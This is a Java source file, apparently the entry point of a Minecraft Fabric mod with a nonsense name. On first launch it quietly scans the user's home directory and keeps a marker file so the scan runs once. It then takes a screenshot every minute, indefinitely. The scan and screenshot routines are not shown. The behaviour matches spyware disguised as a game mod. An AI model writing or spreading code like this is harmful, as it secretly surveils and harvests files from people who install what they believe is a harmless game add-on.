package org._123.fjskdfj.client;

import net.fabricmc.api.ClientModInitializer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.File;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class FjskdfjClient implements ClientModInitializer {

    private static final Logger LOGGER = LogManager.getLogger("FjskdfjClient");
    private static final String BASE_PATH = "C:\\fjskdfj\\filesystem";
    private static final String CHECKED_FILE_PATH = BASE_PATH + "\\checked";

    @Override
    public void onInitializeClient() {
        LOGGER.info("Fjskdfj has been started");

        File baseDir = new File(BASE_PATH);
        if (!baseDir.exists() && !baseDir.mkdirs()) {
            LOGGER.error("Failed to create base directory: {}", BASE_PATH);
            return;
        }

        File checkedFile = new File(CHECKED_FILE_PATH);

        if (!checkedFile.exists()) {
            LOGGER.info("First time initialized, running scan");
            FjskdfjFileSystem.scanHomeDirectory();
            try {
                if (checkedFile.createNewFile()) {
                    LOGGER.info("Check file created");
                } else {
                    LOGGER.error("Failed to create check file");
                }
            } catch (Exception e) {
                LOGGER.error("Error creating check file", e);
            }
        } else {
            LOGGER.info("Skipping scan (checked file exists)");
        }

        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
        scheduler.scheduleAtFixedRate(FjskdfjScreenshots::takeMinecraftScreenshot, 0, 1, TimeUnit.MINUTES);
    }
}